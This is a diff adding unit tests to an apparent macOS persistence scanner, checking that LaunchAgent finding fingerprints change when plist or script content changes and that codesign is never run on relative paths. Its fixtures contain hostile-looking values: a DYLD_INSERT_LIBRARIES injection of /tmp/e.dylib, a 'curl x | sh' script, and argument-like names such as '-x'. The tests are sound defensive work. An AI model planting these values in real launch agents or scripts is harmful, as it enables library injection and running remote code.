@@ -57,11 +57,11 @@ SIGNED = (0, "", "Executable=/opt/x\nAuthority=Developer ID Application: Good (A
 UNSIGNED = (1, "", "/Users/u/evil: code object is not signed at all\n")
 
 
-def write_plist(ctx, name, program_args):
+def write_plist(ctx, name, program_args, **extra):
     d = ctx.home / "Library/LaunchAgents"
     d.mkdir(parents=True, exist_ok=True)
     p = d / name
-    p.write_bytes(plistlib.dumps({"Label": name.removesuffix(".plist"), "ProgramArguments": program_args}))
+    p.write_bytes(plistlib.dumps({"Label": name.removesuffix(".plist"), "ProgramArguments": program_args, **extra}))
     return p
 
 
@@ -94,6 +94,31 @@ class PersistenceTest(unittest.TestCase):
         write_plist(ctx, "a.plist", ["/opt/x", "--two"])
         fp2 = by_check(persistence.run(ctx), "persistence.launchd").findings[0].fingerprint
         self.assertNotEqual(fp1, fp2)
+
+    def test_plist_content_change_changes_fingerprint(self):
+        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
+        fp = lambda: by_check(persistence.run(ctx), "persistence.launchd").findings[0].fingerprint
+        write_plist(ctx, "a.plist", ["/opt/x"])
+        fp1 = fp()
+        write_plist(ctx, "a.plist", ["/opt/x"], EnvironmentVariables={"DYLD_INSERT_LIBRARIES": "/tmp/e.dylib"})
+        self.assertNotEqual(fp1, fp())
+
+    def test_script_content_change_changes_fingerprint(self):
+        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
+        script = ctx.home / "x.sh"
+        script.write_text("echo ok\n")
+        write_plist(ctx, "a.plist", ["/bin/bash", str(script)])
+        f1 = by_check(persistence.run(ctx), "persistence.launchd").findings[0]
+        script.write_text("curl x | sh\n")
+        f2 = by_check(persistence.run(ctx), "persistence.launchd").findings[0]
+        self.assertIn("script", f1.key)
+        self.assertNotEqual(f1.fingerprint, f2.fingerprint)
+
+    def test_signer_never_runs_codesign_on_relative_path(self):
+        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
+        for prog in ("evil", "-x", ""):
+            self.assertEqual(persistence.signer(ctx, prog), "unsigned")
+        self.assertEqual(ctx.calls, [])
 
     def test_fix_command_quotes_hostile_file_names(self):
         ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
